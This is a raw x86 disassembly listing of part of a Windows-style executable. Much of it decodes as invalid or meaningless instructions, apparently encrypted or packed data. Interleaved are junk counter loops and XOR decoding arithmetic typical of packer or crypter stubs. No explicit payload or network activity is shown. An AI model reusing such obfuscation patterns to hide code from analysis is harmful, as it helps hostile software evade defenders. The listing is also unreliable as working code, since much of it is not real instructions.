  40181f:	adc    bh,BYTE PTR [ecx-0x53]
  401822:	sub    dh,BYTE PTR [eax]
  401824:	std    
  401825:	mov    ebp,0xf1a9d2e8
  40182a:	lahf   
  40182b:	shr    cl,cl
  40182d:	scas   al,BYTE PTR es:[edi]
  40182e:	(bad)  
  40182f:	into   
  401830:	jg     0x4017c1
  401832:	add    BYTE PTR [ecx+0x5049d6cb],ch
  401838:	xlat   BYTE PTR ds:[ebx]
  401839:	(bad)  [eax-0x53d08a25]
  40183f:	mov    eax,0xe04b8228
  401844:	shr    eax,0xab
  401847:	out    dx,eax
  401848:	(bad)  
  401849:	jle    0x4017e8
  40184b:	push   cs
  40184c:	test   cl,bl
  40184e:	ret    0xc592
  401851:	xor    ebp,esp
  401853:	and    BYTE PTR [ebp-0x5b],bl
  401856:	fist   WORD PTR [ecx+0x754a3007]
  40185c:	adc    al,0x1b
  40185e:	popf   
  40185f:	push   0xfffffff4
  401861:	sbb    eax,0xd71d6e31
  401866:	push   esi
  401867:	jge    0x4018ae
  401869:	jnp    0x401874
  40186b:	fs push cs
  40186d:	int    0x2
  40186f:	add    eax,0x6c90f188
  401874:	js     0x401868
  401876:	repnz les esp,FWORD PTR [ebx-0x1a8804b1]
  40187d:	xor    edx,DWORD PTR [edx-0x4715a005]
  401883:	and    al,0x5e
  401885:	push   cs
  401886:	test   al,0xc3
  401888:	sub    BYTE PTR [ebx],ch
  40188a:	mov    ch,0x7c
  40188c:	pop    ds
  40188d:	bound  ebp,QWORD PTR [edi+eiz*2]
  401890:	fucom  st(0)
  401892:	cmp    DWORD PTR [eax+eax*2],0xd383271a
  401899:	test   BYTE PTR [edi+0x45],bh
  40189c:	inc    edx
  40189d:	jmp    0x4018b5
  40189f:	stc    
  4018a0:	xlat   BYTE PTR ds:[ebx]
  4018a1:	rep stos BYTE PTR es:[edi],al
  4018a3:	dec    eax
  4018a4:	je     0x4018a6
  4018a6:	inc    ebp
  4018a7:	mov    ebp,DWORD PTR [ecx-0x37e04f31]
  4018ad:	jmp    0x40183e
  4018af:	sbb    eax,0xa767bcff
  4018b4:	jmp    0xd3a7:0x1457e3ad
  4018bb:	sbb    al,0x9b
  4018bd:	out    0x3,al
  4018bf:	mov    DWORD PTR [ecx+0x43373725],0x0
  4018c9:	add    cl,ch
  4018cb:	or     eax,0x8b000000
  4018d0:	sbb    eax,0x433737
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433737,ebx
  4018dc:	cmp    DWORD PTR ds:0x433737,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433737,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43372b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433677,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43366b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43372f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4336f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433667,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433633,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43366f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433667,0x12
  40199d:	cmp    DWORD PTR ds:0x433667,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433667,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433767
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433667,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433667
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433667,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433667
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433667,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433613,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4336f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4336eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4336eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4336eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4336eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4336eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4336eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4336eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4336eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433617,0x13
  401a7a:	cmp    DWORD PTR ds:0x433617,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433617,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433617,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433617
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433617,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433617
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433617,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433677,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433677
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433677,ecx
  401ae9:	cmp    DWORD PTR ds:0x433677,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433677,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433677,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx-0xc]
  401b2b:	stos   BYTE PTR es:[edi],al
  401b2c:	mov    al,ds:0x7e795cba
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401ac9
  401b37:	int    0x75
  401b39:	adc    bh,BYTE PTR [edx-0xf309811]
  401b3f:	push   edi
  401b40:	mov    esp,gs
  401b42:	in     al,0x3c
  401b44:	fwait
  401b45:	pop    esp
  401b46:	popa   
  401b47:	lfs    ebp,FWORD PTR [eax+eiz*8]
  401b4b:	push   ss
  401b4c:	sbb    eax,0xfd63667c
  401b51:	call   0xe0e3:0x410d7793
  401b58:	scas   al,BYTE PTR es:[edi]
  401b59:	loopne 0x401b52
  401b5b:	sbb    ch,0x88
  401b5e:	or     BYTE PTR [ebp+ebp*2-0x71],bh
  401b62:	dec    esi
  401b63:	mov    al,ds:0x70e70a8e
  401b68:	sbb    dl,bh
  401b6a:	or     DWORD PTR [edx+0x732b7531],eax
  401b70:	sbb    BYTE PTR [esi+0x127da683],ch
  401b76:	adc    al,0xaa
  401b78:	shl    bl,0x56
  401b7b:	sbb    dh,BYTE PTR [edx+0x6819e9e3]
  401b81:	add    DWORD PTR [ebx+0x1a],ebx
  401b84:	in     al,dx
  401b85:	pop    ecx
  401b86:	fwait
  401b87:	ror    DWORD PTR [ebp+0x15fd5abc],0xd7
  401b8e:	mov    fs,WORD PTR [edi+ecx*4]
  401b91:	fwait
  401b92:	rol    DWORD PTR [ecx+0x4a],cl
  401b95:	(bad)  
  401b96:	out    0xd8,eax
  401b98:	cmp    DWORD PTR [ecx],esp
  401b9a:	mov    BYTE PTR [ebx+0x5bde8efa],ah
  401ba0:	stc    
  401ba1:	(bad)  
  401ba2:	cmp    al,0xe9
  401ba4:	retf   
  401ba5:	xchg   edi,eax
  401ba6:	inc    esp
  401ba7:	sar    BYTE PTR [eax-0x52],0xcb
  401bab:	xor    dl,BYTE PTR [eax+0x5b947255]
  401bb1:	jp     0x401c21
  401bb3:	jmp    0xa924:0xec7ce207
  401bba:	ror    DWORD PTR [ecx],0x79
  401bbd:	(bad)  
  401bbe:	mov    esp,0x8551a8e4
  401bc3:	lea    ecx,[ebx-0x48]
  401bc6:	cmp    al,0x85
  401bc8:	cmp    ah,BYTE PTR [ebx]
  401bca:	dec    esi
  401bcb:	jns    0x401bda
  401bcd:	in     al,dx
  401bce:	pop    eax
  401bcf:	jno    0x401b6f
  401bd1:	push   eax
  401bd2:	inc    esi
  401bd3:	jmpw   0x276b
  401bd7:	fidiv  WORD PTR [ebx+0x1758108b]
  401bdd:	sub    DWORD PTR [edx-0x7e],esi
  401be0:	dec    esp
  401be1:	add    ah,BYTE PTR [edx-0x57]
  401be4:	mov    edx,0xc5cbe9fd
  401be9:	xor    al,0x6c
  401beb:	and    BYTE PTR [eax-0x47],al
  401bee:	mov    dl,0xdd
  401bf0:	xchg   BYTE PTR [ebx-0x42],dh
  401bf3:	mov    ah,0xd0
  401bf5:	ins    DWORD PTR es:[edi],dx
  401bf6:	add    BYTE PTR [edi+0x682a1ebb],dl
  401bfc:	push   es
  401bfd:	or     al,dl
  401bff:	or     BYTE PTR [ebp-0x69],al
  401c02:	rcr    DWORD PTR [esi],cl
  401c04:	push   ebp
  401c05:	bound  edi,QWORD PTR [ecx]
  401c07:	push   edx
  401c08:	add    BYTE PTR [edi+0x271c4b46],ah
  401c0e:	lock repnz shl DWORD PTR [ecx+0x34],1
  401c13:	movzx  esi,BYTE PTR [esi+0x29]
  401c17:	pusha  
  401c18:	add    al,0x8a
  401c1a:	pop    DWORD PTR [ebx]
  401c1c:	(bad)
  401c1f:	inc    ecx
  401c20:	jg     0x401c2a
  401c22:	fwait
  401c23:	test   al,0xe9
  401c25:	mov    esi,0x1043d212
  401c2a:	mov    eax,0x73f5b1d3
  401c2f:	ret    0xa9bf
  401c32:	loop   0x401c2f
  401c34:	call   0x12bdc78d
  401c39:	mov    cl,0x74
  401c3b:	push   esp
  401c3c:	pop    ecx
  401c3d:	pop    eax
  401c3e:	(bad)  
  401c3f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  401c41:	clc    
  401c42:	inc    eax
  401c43:	dec    edx
  401c44:	in     al,0xf1
  401c46:	inc    esp
  401c47:	mov    cs,WORD PTR [edi-0x7e]
  401c4a:	jecxz  0x401bda
  401c4c:	pop    eax
  401c4d:	adc    edx,esp
  401c4f:	mov    al,0x3d
  401c51:	icebp  
  401c52:	add    edi,DWORD PTR [ebx+0x74891575]
  401c58:	dec    eax
  401c59:	mov    edx,edi
  401c5b:	push   ss
  401c5c:	pop    ds
  401c5d:	loop   0x401c4b
  401c5f:	dec    edi
  401c60:	add    bl,bl
  401c62:	sub    al,0x4
  401c64:	jg     0x401c33
  401c66:	mov    ch,0xde
  401c68:	mov    eax,ds:0xaa6ca5c4
  401c6d:	xchg   esi,eax
  401c6e:	sub    BYTE PTR [ebp+edx*8-0x52],dl
  401c72:	loop   0x401cde
  401c74:	aaa    
  401c75:	lahf   
  401c76:	add    ch,BYTE PTR [ecx+0x2f]
  401c79:	shl    ch,cl
  401c7b:	push   ebp
  401c7c:	push   es
  401c7d:	adc    BYTE PTR [ecx],ah
  401c7f:	xor    BYTE PTR [edx-0x18],0x11
  401c83:	adc    ah,BYTE PTR [edx+0x54]
  401c86:	mov    eax,esp
  401c88:	ror    BYTE PTR [esi+0x4ccbbcd8],0xb3
  401c8f:	cmp    al,0x66
  401c91:	mov    DWORD PTR [esi+0x20d90525],edi
  401c97:	cmp    DWORD PTR [ebp+edi*2+0x2b9a665b],edi
  401c9e:	or     ecx,esi
  401ca0:	cld    
  401ca1:	imul   ebx,edx,0xffffffa1
  401ca4:	sub    esi,ebp
  401ca6:	jg     0x401c7b
  401ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ca9:	icebp  
  401caa:	sar    DWORD PTR [esi-0x67ccacc0],0xfe
  401cb1:	jb     0x401d31
  401cb3:	xchg   ebx,eax
  401cb4:	jns    0x638aa00c
  401cba:	mov    edi,0x290ea92b
  401cbf:	rcl    BYTE PTR [ebx],0x72
  401cc2:	mov    eax,ds:0xb0970ae1
  401cc7:	dec    esi
  401cc8:	adc    DWORD PTR [edx+esi*2-0x57266f1d],ebx
  401ccf:	cld    
  401cd0:	push   edx
  401cd1:	ss rcr eax,cl
  401cd4:	lds    eax,FWORD PTR [eax+0xb9524ac]
  401cda:	push   edi
  401cdb:	loop   0x401ce5
  401cdd:	add    eax,0xd174099f
  401ce2:	popa   
  401ce3:	add    eax,0xd8fdc33e
  401ce8:	rcl    DWORD PTR [edi+0x6b3bb4ea],1
  401cee:	stos   DWORD PTR es:[edi],eax
  401cef:	mov    esp,0x365cb418
  401cf4:	sbb    DWORD PTR [edi+0xd],0x51
  401cf8:	push   ecx
  401cf9:	xor    dl,BYTE PTR [eax-0x1bf40008]
  401cff:	ffreep st(2)
  401d01:	mov    ebx,0xcbe3523e
  401d06:	arpl   WORD PTR [ecx+0x5f],dx
  401d09:	scas   eax,DWORD PTR es:[edi]
  401d0a:	jns    0x401d1b
  401d0c:	fisubr DWORD PTR [ecx-0x68]
  401d0f:	push   edx
  401d10:	mov    al,ds:0x5c71eead
  401d15:	retf   
  401d16:	push   ebx
  401d17:	ret    0xd667
  401d1a:	push   ebx
  401d1b:	mov    dh,0xe6
  401d1d:	fdiv   QWORD PTR [ebx+0x48ee3805]
  401d23:	mov    edx,DWORD PTR [esp+edi*8-0x19]
  401d27:	mov    ecx,DWORD PTR [esi+ebx*8]
  401d2a:	ror    DWORD PTR [eax+0x55fc3a25],1
  401d30:	sbb    ebx,DWORD PTR [edi-0x2ce405c7]
  401d36:	js     0x401ce3
  401d38:	cwde   
  401d39:	arpl   sp,si
  401d3b:	pop    esi
  401d3c:	pop    edi
  401d3d:	mov    dl,0xfe
  401d3f:	dec    ecx
  401d40:	push   edx
  401d41:	outs   dx,DWORD PTR ds:[esi]
  401d42:	scas   al,BYTE PTR es:[edi]
  401d43:	icebp  
  401d44:	fnstcw WORD PTR [eax]
  401d46:	jge    0x401db6
  401d48:	in     eax,dx
  401d49:	mov    cl,0x3e
  401d4b:	imul   edi,ebp,0x74f666f2
  401d51:	mov    ah,0x4c
  401d53:	rcl    DWORD PTR [edi+edx*4+0x53],0xf5
  401d58:	sub    al,0x7e
  401d5a:	mov    dl,0x13
  401d5c:	sub    al,0xf7
  401d5e:	ins    BYTE PTR es:[edi],dx
  401d5f:	jl     0x401d05
  401d61:	push   0x5
  401d63:	push   ebp
  401d64:	sub    al,0xc0
  401d66:	lods   eax,DWORD PTR ds:[esi]
  401d67:	and    BYTE PTR [ebp+eax*1-0x16],dl
  401d6b:	les    esp,FWORD PTR [esi]
  401d6d:	pop    edi
  401d6e:	les    ebp,FWORD PTR [ebp-0x4ef4b42b]
  401d74:	mov    ?,WORD PTR [ebx+edx*8+0x5fceab7c]
  401d7b:	ins    BYTE PTR es:[edi],dx
  401d7c:	jmp    edi
  401d7e:	pop    ebx
  401d7f:	pop    DWORD PTR [ecx]
  401d81:	mov    al,ds:0x6dece105
  401d86:	or     al,0x9a
  401d88:	fisubr WORD PTR [ebx]
  401d8a:	imul   edx,edx,0x4c
  401d8d:	xlat   BYTE PTR ds:[ebx]
  401d8e:	out    dx,eax
  401d8f:	pop    esp
  401d90:	sub    cl,ch
  401d92:	mov    ch,0x1d
  401d94:	imul   ecx,DWORD PTR [edx+0x5c],0x9bd55017
  401d9b:	sbb    bh,dh
  401d9d:	push   0x12
  401d9f:	sbb    ecx,DWORD PTR [ebx+0x7b3698b3]
  401da5:	push   esi
  401da6:	out    dx,eax
  401da7:	push   ebx
  401da8:	loope  0x401daf
  401daa:	lods   eax,DWORD PTR ds:[esi]
  401dab:	xchg   esp,eax
  401dac:	es pop ebp
  401dae:	ja     0x401e17
  401db0:	ror    DWORD PTR [eax],0x4d
  401db3:	fidiv  DWORD PTR [edx-0x6803f808]
  401db9:	pop    ebx
  401dba:	sbb    eax,0xdc88074c
  401dbf:	(bad)  
  401dc0:	cmp    eax,0xdbb8ef05
  401dc5:	sub    al,0xf2
  401dc7:	stos   BYTE PTR es:[edi],al
  401dc8:	add    eax,0x3829c0dd
  401dcd:	sbb    DWORD PTR [edx],ebx
  401dcf:	leave  
  401dd0:	in     al,0xe0
  401dd2:	cmp    ah,BYTE PTR [eax+0x13]
  401dd5:	push   ecx
  401dd6:	int    0x4e
  401dd8:	sbb    DWORD PTR [ebp+0x4902e03c],ecx
  401dde:	dec    esi
  401ddf:	popf   
  401de0:	sar    dl,0x97
  401de3:	icebp  
  401de4:	fiadd  DWORD PTR [esi]
  401de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401de7:	scas   al,BYTE PTR es:[edi]
  401de8:	ret    0x59a0
  401deb:	sub    ecx,eax
  401ded:	xchg   esp,eax
  401dee:	ins    DWORD PTR es:[edi],dx
  401def:	push   ecx
  401df0:	lea    edx,[esi+0x3e]
  401df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401df4:	popa   
  401df5:	and    ah,BYTE PTR [ecx]
  401df7:	inc    ebp
  401df8:	jge    0x401dc1
  401dfa:	xchg   esi,eax
  401dfb:	repz (bad) 
  401dfd:	sub    edi,edx
  401dff:	pop    ebp
  401e00:	push   0x5e
  401e02:	mov    ebp,0xfc0d9e74
  401e07:	push   0x46e753ae
  401e0c:	sti    
  401e0d:	jg     0x401dbd
  401e0f:	xor    DWORD PTR [edi],eax
  401e11:	dec    ebp
  401e12:	into   
  401e13:	mov    ecx,0xbe0f25c6
  401e18:	inc    edx
  401e19:	push   0x678f60ed
  401e1e:	lods   eax,DWORD PTR ds:[esi]
  401e1f:	into   
  401e20:	(bad)  
  401e21:	stos   BYTE PTR es:[edi],al
  401e22:	aad    0x6
  401e24:	push   gs
  401e26:	inc    esp
  401e27:	sti    
  401e28:	test   eax,0xd6189327
  401e2d:	clc    
  401e2e:	adc    eax,0x9cdbeff0
  401e33:	jecxz  0x401e30
  401e35:	outs   dx,DWORD PTR ds:[esi]
  401e36:	test   eax,0xe61d83e5
  401e3b:	jle    0x401e17
  401e3d:	popa   
  401e3e:	mov    ecx,0xbbdc058d
  401e43:	rol    edx,1
  401e45:	data16 xor bh,BYTE PTR [ebx]
  401e48:	aam    0xbd
  401e4a:	sbb    BYTE PTR [edi],al
  401e4c:	mov    bl,0x6f
  401e4e:	and    DWORD PTR ds:0xdc50f6e2,0x3d
  401e55:	jle    0x401ecb
  401e57:	push   0x3daa5126
  401e5c:	mov    ah,0x54
  401e5e:	cld    
  401e5f:	sub    BYTE PTR [edx],0xd8
  401e62:	add    dl,ch
  401e64:	lods   eax,DWORD PTR ds:[esi]
  401e65:	pusha  
  401e66:	std    
  401e67:	pop    ss
  401e68:	inc    ecx
  401e69:	rol    DWORD PTR [edi+0x7c],0x1d
  401e6d:	pop    ds
  401e6e:	or     dl,BYTE PTR [eax]
  401e70:	cmp    esp,DWORD PTR [esi-0x78]
  401e73:	ins    BYTE PTR es:[edi],dx
  401e74:	cmp    BYTE PTR [edi],dh
  401e76:	mov    edi,0x4c828f75
  401e7b:	retf   0x838a
  401e7e:	add    BYTE PTR [ecx],ah
  401e80:	xchg   edx,eax
  401e81:	add    ebx,DWORD PTR [eax]
  401e83:	in     al,0x6c
  401e85:	jp     0x401eca
  401e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e88:	push   ebp
  401e89:	inc    esp
  401e8a:	shr    BYTE PTR [ecx],cl
  401e8c:	mov    eax,0xb18b0782
  401e91:	idiv   DWORD PTR [eax]
  401e93:	dec    esp
  401e94:	and    BYTE PTR [eax-0x2d],ah
  401e97:	jb     0x401ead
  401e99:	push   ecx
  401e9a:	ins    DWORD PTR es:[edi],dx
  401e9b:	into   
  401e9c:	mov    cl,cl
  401e9e:	push   ds
  401e9f:	inc    DWORD PTR [ecx+edi*4]
  401ea2:	push   0xffffff88
  401ea4:	cmp    bl,bl
  401ea6:	sbb    esp,DWORD PTR [esi+0x192eb909]
  401eac:	idiv   DWORD PTR [edi-0x681dc2da]
  401eb2:	pushf  
  401eb3:	xchg   BYTE PTR [edx],ah
  401eb5:	adc    ecx,DWORD PTR [ecx+edx*8-0x2b]
  401eb9:	inc    esi
  401eba:	retf   
  401ebb:	lea    ebx,ds:0x4daa7f7f
  401ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ec2:	xor    al,0x16
  401ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ec5:	jle    0x401f32
  401ec7:	jmp    0x2c4a:0xc8cbb1c
  401ece:	adc    eax,0x84f01af0
  401ed3:	gs dec ebp
  401ed5:	lea    esp,[edx-0x605db0]
  401edb:	enter  0x14fb,0x84
  401edf:	test   al,0xa1
  401ee1:	out    dx,eax
  401ee2:	pusha  
  401ee3:	and    eax,0x849a38b6
  401ee8:	scas   al,BYTE PTR es:[edi]
  401ee9:	das    
  401eea:	xchg   ebx,eax
  401eeb:	(bad)  
  401eec:	out    dx,eax
  401eed:	fstp   TBYTE PTR ds:0xef4c0113
  401ef3:	or     al,0xb1
  401ef5:	sub    BYTE PTR [ebx+0x1b],cl
  401ef8:	mov    ds:0x97796395,al
  401efd:	ins    BYTE PTR es:[edi],dx
  401efe:	xcrypt-ofb (bad)
  401eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f00:	das    
  401f01:	hlt    
  401f02:	pusha  
  401f03:	mov    ds:0xa91a347e,eax
  401f08:	inc    ecx
  401f09:	or     dh,al
  401f0b:	cs add ebp,eax
  401f0e:	inc    esi
  401f0f:	or     eax,0x7600fb11
  401f14:	add    ecx,DWORD PTR [ebp+0x5ab47fa]
  401f1a:	inc    edi
  401f1b:	repz and al,0x4
  401f1e:	xchg   esp,eax
  401f1f:	fwait
  401f20:	leave  
  401f21:	dec    ecx
  401f22:	sub    dl,dl
  401f24:	rcr    dl,1
  401f26:	dec    ecx
  401f27:	add    eax,edi
  401f29:	mov    ebx,DWORD PTR ds:0x43370b
  401f2f:	mov    ecx,DWORD PTR ds:0x433757
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433747
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43361b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	cwde   
  401f5d:	fist   DWORD PTR [esi-0x6e]
  401f60:	dec    ebp
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	or     bl,BYTE PTR [esi]
  401f6a:	cmp    al,0x9
  401f6c:	or     DWORD PTR ds:0x2165e98e,edi
  401f72:	sub    DWORD PTR [esi],edi
  401f74:	aas    
  401f75:	mov    DWORD PTR ds:0x8b3d2214,eax
  401f7b:	mov    bl,0x6d
  401f7d:	jno    0x401f42
  401f7f:	inc    ebx
  401f80:	xchg   edi,eax
  401f81:	sbb    al,0x50
  401f83:	jmp    0x4dbf042
  401f88:	xlat   BYTE PTR ds:[ebx]
  401f89:	out    dx,al
  401f8a:	fimul  WORD PTR [ecx+0x67]
  401f8d:	or     ch,BYTE PTR [ebx+0x1d]
  401f90:	or     edi,esi
  401f92:	push   esi
  401f93:	pop    esi
  401f94:	ror    DWORD PTR [edx+0xe8cceec],cl
  401f9a:	pop    ds
  401f9b:	cdq    
  401f9c:	pop    edi
  401f9d:	jb     0x401fdd
  401f9f:	xor    al,0x9a
  401fa1:	icebp  
  401fa2:	call   0x624a771e
  401fa7:	outs   dx,BYTE PTR ds:[esi]
  401fa8:	mov    eax,ds:0xcdaccacf
  401fad:	mov    edx,0xddf0b748
  401fb2:	out    dx,al
  401fb3:	push   ds
  401fb4:	outs   dx,DWORD PTR ds:[esi]
  401fb5:	xchg   ebp,eax
  401fb6:	xchg   esp,eax
  401fb7:	in     al,0xe9
  401fb9:	ds mov bh,0x36
  401fbc:	dec    esp
  401fbd:	cmp    cl,BYTE PTR [ebp-0x23724942]
  401fc3:	data16 fmul DWORD PTR [edx]
  401fc6:	add    DWORD PTR [edx],edi
  401fc8:	imul   esi,DWORD PTR [ebp+0x1cdfcb90],0x6413425e
  401fd2:	cli    
  401fd3:	push   es
  401fd4:	sahf   
  401fd5:	pop    ecx
  401fd6:	xor    dh,BYTE PTR [ebx+ecx*8]
  401fd9:	test   eax,0x34ad69ab
  401fde:	sbb    DWORD PTR [esi+0x2973a528],ebx
  401fe4:	xchg   ebx,eax
  401fe5:	aas    
  401fe6:	sub    eax,0xabf8f45
  401feb:	fbld   TBYTE PTR [esi+0x20]
  401fee:	(bad)  
  401fef:	jmp    0xfa16c381
  401ff4:	sbb    esp,DWORD PTR [esi-0x57]
  401ff7:	inc    edx
  401ff8:	rcl    bl,cl
  401ffa:	ret    0xc16f
  401ffd:	pusha  
  401ffe:	xchg   BYTE PTR [edx],al
  402000:	jp     0x401f86
  402002:	adc    eax,0x64725d6f
  402007:	jl     0x401fa7
  402009:	sub    DWORD PTR [ebx-0x61],edi
  40200c:	into   
  40200d:	and    al,0x7b
  40200f:	(bad)  
  402010:	ins    DWORD PTR es:[edi],dx
  402011:	jmp    0x4869:0xe889443b
  402018:	dec    esp
  402019:	adc    dh,BYTE PTR [edi]
  40201b:	(bad)  
  40201d:	inc    edx
  40201e:	fld    QWORD PTR [esi+0x3bab2212]
  402024:	ins    BYTE PTR es:[edi],dx
  402025:	jg     0x401ff9
  402027:	or     al,0x35
  402029:	jp     0x402000
  40202b:	js     0x401fcb
  40202d:	push   es
  40202e:	inc    esi
  40202f:	addr16 xchg ecx,eax
  402031:	dec    ecx
  402032:	pop    ebp
  402033:	sti    
  402034:	or     bh,BYTE PTR [ebx-0x6eb33d2c]
  40203a:	fwait
  40203b:	mov    ebx,0xbbf9a2fe
  402040:	lods   eax,DWORD PTR ds:[esi]
  402041:	sub    eax,0x3b81cbef
  402046:	ret    0x4542
  402049:	push   ebx
  40204a:	jne    0x402028
  40204c:	jg     0x40205e
  40204e:	retf   0xab6a
  402051:	mov    ah,0x85
  402053:	adc    BYTE PTR [ebx-0x43],bh
  402056:	pop    edi
  402057:	aam    0x3c
  402059:	dec    ebx
  40205a:	and    BYTE PTR [ebx+eiz*1],dl
  40205d:	mov    BYTE PTR [ebx-0x73],0x68
  402061:	inc    ebp
  402062:	add    ecx,DWORD PTR [ebx]
  402064:	and    ebx,esp
  402066:	mov    al,ds:0xd2e0ac15
  40206b:	dec    ebp
  40206c:	sub    ebx,DWORD PTR [ecx]
  40206e:	push   esi
  40206f:	cdq    
  402070:	add    al,0xf1
  402072:	out    dx,eax
  402073:	add    al,0x95
  402075:	mov    esi,0xf06e9af2
  40207a:	pop    esi
  40207b:	shr    DWORD PTR [esi-0x59],0x8
  40207f:	xchg   ebp,eax
  402080:	int    0x2b
  402082:	push   0x57624524
  402087:	lahf   
  402088:	and    al,0xdb
  40208a:	mov    DWORD PTR ds:0x4b83bbe,ecx
  402090:	sub    DWORD PTR [ebx],esi
  402092:	fldenv [edx+0x8]
  402095:	scas   eax,DWORD PTR es:[edi]
  402096:	pop    ss
  402097:	and    ebp,DWORD PTR [ebx-0x3a997c05]
  40209d:	xor    ecx,edi
  40209f:	pop    ecx
  4020a0:	dec    ebp
  4020a1:	sbb    ebx,DWORD PTR [eax]
  4020a3:	leave  
  4020a4:	aam    0xfe
  4020a6:	add    cl,BYTE PTR [esp+edi*8+0x76]
  4020aa:	push   edx
  4020ab:	or     al,0x74
  4020ad:	and    DWORD PTR [ebx+0x53],ebx
  4020b0:	pop    edi
  4020b1:	jbe    0x4020fe
  4020b3:	adc    eax,ecx
  4020b5:	push   ebp
  4020b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
